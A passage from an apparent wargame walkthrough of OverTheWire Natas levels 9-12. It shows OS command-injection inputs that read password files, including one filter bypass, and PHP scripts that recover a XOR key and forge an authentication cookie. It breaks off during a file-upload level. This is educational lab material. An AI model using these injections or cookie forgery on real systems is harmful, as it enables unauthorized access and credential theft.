&lt;p&gt;The crafted input is:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This gives us the password.&lt;/p&gt;
&lt;h3&gt;Level 10: OS Command Injection II&lt;/h3&gt;
&lt;p&gt;This level starts with the same search form from the previous level. However, this time we get the warning:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For security reasons, we now filter on certain characters.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We take a look at the source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt;
&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_REQUEST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;needle&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;preg_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/[;|&amp;amp;]/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Input contains an illegal character!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;passthru&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;grep -i &lt;/span&gt;&lt;span class="si"&gt;$key&lt;/span&gt;&lt;span class="s2"&gt; dictionary.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The difference here is an &lt;em&gt;if&lt;/em&gt; clause with the function &lt;a href="http://php.net/manual/en/function.preg-match.php"&gt;preg_match&lt;/a&gt;. This function is used to search for a pattern in a string, &lt;em&gt;i.e.&lt;/em&gt;, it clears the string against the pattern &lt;strong&gt;;&lt;/strong&gt;, &lt;strong&gt;|&lt;/strong&gt;,  and &lt;strong&gt;&amp;amp;&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;We cannot use the same attack as before with a semicolon!&lt;/p&gt;
&lt;p&gt;We need to some other injection that does not need those symbols.&lt;/p&gt;
&lt;p&gt;When I was messing around in the previous level I noticed that we can use &lt;strong&gt;""&lt;/strong&gt; as an input.  Awesome. The following input reveals the password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;  &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas_webpass&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;natas11&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Level 11: Cookies and XOR Encryption&lt;/h3&gt;
&lt;p&gt;This level starts with an input form to set a background color and a message:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;cookies are protected with XOR encryption&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/aD4CKbY.png" /&gt;&lt;/p&gt;
&lt;p&gt;Let's inspect the source code in several steps. First, we have this suspicious array:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="n"&gt;defaultdata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will see soon that this array is passed to a cookie as an encrypted XOR string.&lt;/p&gt;
&lt;p&gt;What happens if we manage to set &lt;em&gt;showpassword&lt;/em&gt; to &lt;em&gt;yes&lt;/em&gt;? This is answered in the end of the code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; == &amp;quot;yes&amp;quot;) {
    print &amp;quot;The password for natas12 is &lt;span class="nt"&gt;&amp;lt;censored&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;&amp;quot;;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We know our way now.&lt;/p&gt;
&lt;p&gt;We then have this XOR function that take an input value, &lt;em&gt;$text&lt;/em&gt;, and XOR to a variable, &lt;em&gt;$key&lt;/em&gt;. So we know that XORing the output with what we sent as the input can return the content of &lt;em&gt;$key&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;censored&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="c1"&gt;// Iterate through each character&lt;/span&gt;
    &lt;span class="nb"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$outText&lt;/span&gt; &lt;span class="nx"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$text&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; ^ $key&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
    }
    return $outText;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The rest of the code is only important to show that the string encoded in &lt;em&gt;base64&lt;/em&gt; before it's sent to the cookie. The function in the bottom just changes the color of the background:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nx"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="bp"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$mydata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$def&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nv"&gt;$tempdata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)), true);
    if(is_array($tempdata) &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; array_key_exists(&amp;quot;showpassword&amp;quot;, $tempdata) &lt;span class="err"&gt;&amp;amp;&amp;amp;&lt;/span&gt; array_key_exists(&amp;quot;bgcolor&amp;quot;, $tempdata)) {
        if (preg_match(&amp;#39;/^#(?:&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="na"&gt;-f&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nb"&gt;d&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;{6})$/i&amp;#39;, $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)) {
        $mydata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;showpassword&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
        $mydata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $tempdata&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
        }
    }
    }
    return $mydata;
}
function saveData($d) {
    setcookie(&amp;quot;data&amp;quot;, base64_encode(xor_encrypt(json_encode($d))));
}
$data = loadData($defaultdata);
if(array_key_exists(&amp;quot;bgcolor&amp;quot;,$_REQUEST)) {
    if (preg_match(&amp;#39;/^#(?:&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="na"&gt;-f&lt;/span&gt;&lt;span class="o"&gt;\&lt;/span&gt;&lt;span class="nb"&gt;d&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;{6})$/i&amp;#39;, $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;)) {
        $data&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
    }
}
saveData($data);
&lt;span class="nt"&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
Background color: &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;bgcolor&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?=&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Set color&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Since we know the plaintext, given by the variable &lt;em&gt;$defaultdata&lt;/em&gt;, all we need is the value in the cookie. With that, we can XOR them and get our password.&lt;/p&gt;
&lt;p&gt;We can use the plugin I described before, &lt;a href="http://www.editthiscookie.com/start/"&gt;edit this cookie&lt;/a&gt;, to get this value:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we write the following script in PHP, modifying the XOR function to take our input:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
&lt;span class="nx"&gt;$cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="nx"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;no&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$outText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$cookie&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running it returns the XOR key that encrypts the &lt;em&gt;$defaultdata&lt;/em&gt; variable:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;php xor.php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The repeated pattern is obviously a key.&lt;/p&gt;
&lt;p&gt;The next step is to modify the value of that variable to have &lt;em&gt;showpassword&lt;/em&gt; saying &lt;em&gt;yes&lt;/em&gt;. Then this should be XORerd with the right key in &lt;em&gt;$key&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;For that, we created the following script:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt_mod&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="nx"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
    &lt;span class="nx"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;qw8J&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$outText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt; &lt;span class="nx"&gt;base64_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;xor_encrypt_mod&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;span class="o"&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This results in the code we need to add to the cookie. We do this through the plugin. Refreshing the page returns our password.&lt;/p&gt;
&lt;h3&gt;Level 12: File Inclusion Attack&lt;/h3&gt;
&lt;p&gt;This challenge starts with a JPG file uploader:
&lt;img alt="" src="http://i.imgur.com/xcSJ5kr.png" /&gt;&lt;/p&gt;
&lt;p&gt;Inspecting the source code, we see that the first function returns a random string of length 10:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;genRandomString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;$length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;$characters&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nx"&gt;$string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;$length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;$p&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
